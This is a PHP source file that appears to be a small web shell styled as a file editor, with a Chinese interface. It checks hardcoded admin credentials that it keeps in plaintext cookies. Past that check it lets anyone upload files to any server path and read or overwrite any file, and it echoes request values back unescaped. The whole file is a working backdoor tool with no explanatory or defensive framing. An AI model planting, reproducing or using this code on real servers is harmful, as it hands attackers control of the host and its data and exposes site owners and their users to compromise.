<?php
	$username = @ $_REQUEST["username"];
	$password = @ $_REQUEST["password"];
	if(!empty($username)||!empty($password)){
		setcookie("adminusername", $username, 0,"/");
		setcookie("adminpassword", $password, 0,"/");
		header("Location:".$_SERVER['PHP_SELF']);
		exit;
	}
	$username = @ $_COOKIE["adminusername"];
	$password = @ $_COOKIE["adminpassword"];
	if($username!="admin"||$password!="xaour"){
		echo "<form name=form0 action=\"".$_SERVER['PHP_SELF']."\" method=\"post\">";
		echo "<input type='text' name='username' style='height:22px;width:120px'>";
		echo " <input type='password' name='password' style='height:22px;width:120px'>";
		echo "<input type='submit' value='submit'></form>";
		die();
	}

	$op = $_REQUEST["op"];
	$filename = $_REQUEST["filename"];

	if($op=="upload"){
		$uploadpath = $_REQUEST["uploadpath"];
		if(substr($uploadpath,strlen($uploadpath)-1,1)!="/"&&!empty($uploadpath))$uploadpath.="/";
		$uploadfile = $_REQUEST["ofile"];
		$ofile_loc = $_REQUEST["ofile_loc"];
		$file_type = $_FILES["ofile"]["type"];
		$file_name = $_FILES["ofile"]["name"];
		$tmp_name=$_FILES["ofile"]["tmp_name"];
		$status = $_FILES["ofile"]["error"];
		$filename = $uploadpath.$file_name;
		$result= move_uploaded_file($tmp_name,$filename);
		if($status==0){
			if($_REQUEST["uploadopen"]){
				$op = "open";
			}
		}
	}

	if(!is_file($filename)){
		$status .= "<font color=#FF0080><b>文件".$filename."不存在</b></font>";
		$op = "";
	}

	if($op=="save"){
		$content = $_REQUEST["content"];
		$content = htmlspecialchars_decode($content, ENT_QUOTES);
		$content = stripslashes($content);
		@file_put_contents($filename, $content);
		$op = "open";
	}

	if($op=="open"){
		$content = @file_get_contents($filename);
		$content = htmlspecialchars($content, ENT_QUOTES);
		$status = "<font color=#FF0080><b>文件打开成功</b></font>";
	}



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">

</style>
<title>EDIT</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" type="text/css" href="/client/common.css">
<script language=javascript>
function setOprValue(oprvalue){
	document.getElementById("op").value = oprvalue;
	document.form0.submit();
}
</script>
</head>
<body bgcolor="#FFFFFF" text="#000000" leftmargin=0 topmargin=0 rightmargin=0>
<form name=form0 action="<?=$_SERVER['PHP_SELF']?>" method="post" enctype="multipart/form-data">
<input type="hidden" name="op" id="op" value="">
<table style="width:98%;height:98%;border:5px #99CC00 solid;">
	<tr>
		<td align="left" height="40" style="background:#FFF2CA;">
			<nobr>
			上传路径：<input type="text" name="uploadpath" value="<?=$uploadpath?>" style="height:16px;width:200px">
			上传文件：<input type="file" id="ofile" name="ofile" style="height:20px; width: 450px" value="<?=$uploadfile?>">
			<input type="checkbox" name="uploadopen" checked>同时打开
			<input type="button" onclick=setOprValue("upload"); value=" 上传 ">
			</nobr>
		</td>
	</tr>

	<tr>
		<td align="left">
			<nobr>
			文 件 名：<input type="text" name="filename" value="<?=$filename?>" style="height:16px;width:200px;">
			<input type="submit" value=" 打开 " onClick=setOprValue("open"); style="height:20px">
			<input type="button" value=" 保存 " onClick=setOprValue("save"); style="height:20px">
			<?=$status?>
			</nobr>
		</td>
	</tr>

	<tr>
		<td>
			<textarea name="content" style="height:730px;width:99%;background:#FFEFDF;"><?=$content?></textarea>
		</td>
	</tr>
</table>
</form>

</body>
</html>